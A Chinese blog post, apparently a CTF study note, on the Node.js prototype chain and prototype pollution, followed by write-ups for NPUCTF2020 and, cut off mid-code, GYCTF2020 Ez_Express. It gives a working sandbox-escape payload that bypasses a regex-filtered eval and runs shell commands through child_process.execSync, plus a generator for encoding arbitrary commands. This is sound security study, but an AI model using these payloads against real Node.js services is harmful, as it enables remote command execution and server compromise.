    <content type="html"><![CDATA[<p>[toc]</p><h1 id="NodeJs基础"><a href="#NodeJs基础" class="headerlink" title="NodeJs基础"></a>NodeJs基础</h1><p>好像也没啥写的。。</p><h2 id="child-process-创建子进程"><a href="#child-process-创建子进程" class="headerlink" title="child_process(创建子进程)"></a>child_process(创建子进程)</h2><p>分为异步和同步：</p><p>异步：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">child_process.exec(command[, options][, callback])</span><br><span class="line">child_process.execFile(file[, args][, options][, callback])</span><br><span class="line">child_process.fork(modulePath[, args][, options])</span><br><span class="line">child_process.spawn(command[, args][, options])</span><br></pre></td></tr></table></figure><p>同步：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">child_process.execFileSync(file[, args][, options])</span><br><span class="line">child_process.execSync(command[, options])</span><br><span class="line">child_process.spawnSync(command[, args][, options])</span><br></pre></td></tr></table></figure><p>异步中，<code>spawn</code>是基础，其他的<code>fork</code>、<code>exec</code>、<code>execFile</code>都是基于<code>spawn</code>来生成的。</p><h2 id="Javascript原型链"><a href="#Javascript原型链" class="headerlink" title="Javascript原型链"></a>Javascript原型链</h2><blockquote><p>  <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a></p></blockquote><h3 id="原型与原型链"><a href="#原型与原型链" class="headerlink" title="原型与原型链"></a>原型与原型链</h3><p>js中没有子类父类的概念，也没有类和实例，js中的继承使用”原型链”来实现。</p><p>JS中几乎所有的事物都是对象，如下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;asdf&quot;</span>,    </span><br><span class="line">    <span class="string">&quot;blog&quot;</span>: <span class="string">&quot;https://asdf.github.io&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">a.name;</span><br><span class="line">a.blog;</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br></pre></td></tr></table></figure><p>其中访问对像的属性，可以有两种方式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.name; </span><br><span class="line">a[<span class="string">&quot;name&quot;</span>];</span><br></pre></td></tr></table></figure><h3 id="原型的定义和继承"><a href="#原型的定义和继承" class="headerlink" title="原型的定义和继承"></a>原型的定义和继承</h3><p>在javascript中一切皆对象，因为所有的变量，函数，数组，对象 都始于object的原型即object.prototype</p><p>每个实例对象（object）都有一个私有属性（称之为 __proto__ ）指向它的构造函数的原型对象（prototype）。即任何对象都是由一个构造函数创建的.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">Father</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="keyword">this</span>.last_name = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">Son</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line">let son = <span class="keyword">new</span> Son()</span><br><span class="line">console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)</span><br><span class="line"><span class="comment">//Son类继承了Father类的last_name属性，最后输出的是Name: Melania Trump。</span></span><br></pre></td></tr></table></figure><p>对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：(查找顺序)</p><ol><li> 在对象son中寻找last_name</li><li> 如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li> 如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li> 依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li></ol><blockquote><p>  当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 __proto__ ）指向它的构造函数的原型对象（prototype）。该原型对象也有一个自己的原型对象（__proto__），层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a函数内容是a类的构造函数，其中<code>this.name</code>、<code>this.age</code>就是a类的属性。</p><p>在JavaScript中，声明了一个函数a，然后浏览器就自动在内存中创建一个对象b，a函数默认有一个属性(原型对象:prototype)指向了这个对象b，b就是函数a的原型对象，简称原型。同时，对象b默认有属性constructor指向函数a。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; a.prototype</span><br><span class="line">&#123;&#125; </span><br><span class="line">&gt; a.prototype.constructor</span><br><span class="line">[<span class="built_in">Function</span>: a]</span><br></pre></td></tr></table></figure><p>创建一个对象a，对象a会默认有一个属性proto指向构造函数A的原型对象b</p><p><code>A.prototype == a.__proto__</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; <span class="keyword">let</span> a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; A.prototype = a.__proto__</span><br><span class="line">&#123;&#125;</span><br><span class="line">&gt; a.constructor</span><br><span class="line">[<span class="built_in">Function</span>: A]</span><br></pre></td></tr></table></figure><p>当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向null，如果此时还没有搜索到，就会返回 undefined。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; a.__proto__</span><br><span class="line">&#123;&#125;</span><br><span class="line">&gt; a.__proto__.__proto__</span><br><span class="line">[<span class="built_in">Object</span>: <span class="literal">null</span> prototype] &#123;&#125;</span><br><span class="line">&gt; a.__proto__.__proto__.__proto__</span><br></pre></td></tr></table></figure><p><img src="/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Veur1v6GwiNs3bQ.png" alt="img"></p><p>由于对象之间存在继承关系，所以当我们要使用或者输出一个变量就会通过原型链向上搜索，当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined</p><p>图中的原型链是 <code>cat-&gt;Cat.protype-&gt;Object.prototype-&gt;null</code></p><p><img src="/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/SL3NypUdR5MlDAo.png" alt="img"></p><h1 id="NodeJs原型链污染"><a href="#NodeJs原型链污染" class="headerlink" title="NodeJs原型链污染"></a>NodeJs原型链污染</h1><p>原型链污染就是修改其构造函数中的属性值，使其他通过该构造函数实例化出的对象也具有这个属性的值。</p><p><code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？demo:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)</span><br></pre></td></tr></table></figure><p>foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p><p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><p>可能存在原型链污染的情况：</p><ul><li>  对象merge</li><li>  对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><p>以merge举例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个key如果是<code>__proto__</code>，就有可能造成原型链污染。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure><p>没有成功，这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p><p>我们将代码改成如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure><p>成功污染。在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p><h1 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h1><h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><p>好吧，其实这个不是原型链污染的题，做完才发现。。但还是学到很多</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">&#x27;./key.js&#x27;</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">        .update(s)</span><br><span class="line">        .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>).toString();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> template.replace(<span class="string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.join(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;PHPSESSION&#x27;</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">    keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">    <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">    <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first !== second &amp;&amp; md5(first + keys[<span class="number">0</span>]) === md5(second + keys[<span class="number">0</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                result = saferEval(req.body.e) || <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(e);</span><br><span class="line">                result = <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        results.unshift(<span class="string">&#x27;Not verified!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        results.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    req.session.results = results;</span><br><span class="line">    res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">    res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">    req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">    res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>主要的就是<code>first.length === second.length &amp;&amp; first !== second &amp;&amp; md5(first + keys[0]) === md5(second + keys[0])</code>，然后绕过一个正则，</p><p>可以使用正则可视化：</p><p><img src="/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20220301191754136.png" alt="image-20220301191754136"></p><p>允许Math.xxx或者一堆字符，或者科学计数法。</p><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>首先是MD5的绕过。使用了相加，可能就是弱类型，<code>app.use(bodyParser.json());</code>指明了允许在Content-Type是application/json时，可以以json格式解析数据，<code>&#123;&quot;e&quot;: &quot;1+1&quot;, &quot;first&quot;: &quot;1&quot;, &quot;second&quot;: [1]&#125;</code></p><h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><p>允许Math，取Function，Function将我们获得的字符串作为函数执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Math</span>.constructor</span><br><span class="line">[<span class="built_in">Function</span>: <span class="built_in">Object</span>]</span><br><span class="line">&gt; <span class="built_in">Math</span>.constructor.constructor</span><br><span class="line">[<span class="built_in">Function</span>: <span class="built_in">Function</span>]</span><br></pre></td></tr></table></figure><p>可以执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=<span class="built_in">Math</span>.constructor.constructor</span><br><span class="line"><span class="built_in">console</span>.log(a(<span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;).toString()&quot;</span>)())</span><br></pre></td></tr></table></figure><p>不允许字符出现，利用String.fromCharCode()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    s = <span class="string">f&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;).toString()&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;,&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">ord</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(gen(<span class="string">&#x27;cat /flag&#x27;</span>))</span><br></pre></td></tr></table></figure><p>可以利用字符串拼接出string：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Math</span>+<span class="number">1</span></span><br><span class="line"><span class="string">&#x27;[object Math]1&#x27;</span></span><br></pre></td></tr></table></figure><p>箭头函数表示自调用<code>(()=&gt;())()</code>，例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;123123&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;;</span><br><span class="line">b(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> c = <span class="function">(<span class="params">x</span>) =&gt;</span> <span class="built_in">console</span>.log(x);</span><br><span class="line">c(<span class="number">123</span>);</span><br></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="params">Math</span>=&gt;</span></span><br><span class="line">    (<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,</span><br><span class="line">            <span class="built_in">Math</span>.constructor(</span><br><span class="line">                <span class="built_in">Math</span>.fromCharCode(<span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,</span><br><span class="line">                    <span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">46</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">77</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">117</span>,<span class="number">108</span>,<span class="number">101</span>,</span><br><span class="line">                    <span class="number">46</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,</span><br><span class="line">                    <span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">83</span>,</span><br><span class="line">                    <span class="number">121</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">39</span>,<span class="number">41</span>))()</span><br><span class="line">    )</span><br><span class="line">)(<span class="built_in">Math</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p><code>www.zip</code> 下载，在route/index.js，有merge和clone，那就是了，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.session.user.user != <span 